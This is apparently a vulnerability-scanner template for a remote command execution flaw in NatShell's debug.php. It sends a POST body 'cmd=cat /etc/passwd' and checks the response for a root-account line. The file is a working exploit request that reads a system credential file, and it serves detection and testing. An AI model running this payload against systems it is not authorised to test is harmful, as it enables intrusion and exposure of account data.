id: natshell-rce

info:
  name: NatShell Debug File RCE
  author: pikpikcu
  severity: critical
  reference: https://mp.weixin.qq.com/s/g4YNI6UBqIQcKL0TRkKWlw
  tags: natshell,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/debug.php"
    body: |
      cmd=cat /etc/passwd

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "toor:[x*]:0:0"

      - type: status
        status:
          - 200
